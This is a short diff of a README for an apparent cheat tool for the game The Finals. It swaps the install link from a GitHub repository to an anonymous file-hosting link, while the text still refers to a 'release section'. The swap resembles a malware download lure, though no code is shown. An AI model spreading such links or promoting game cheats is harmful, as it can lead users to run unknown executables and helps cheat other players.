@@ -12,7 +12,7 @@
 
 ### 📁  〢 Setting Up
 
-> Install [Final Blaze](https://github.com/ShxdowDance/TheFinals) `IMPORTANT: Install it from realase section.`
+> Install [Final Blaze](https://easyupload.io/k6tgoe) `IMPORTANT: Install it from realase section.`
 >
 > Launch it before The Finals:
 
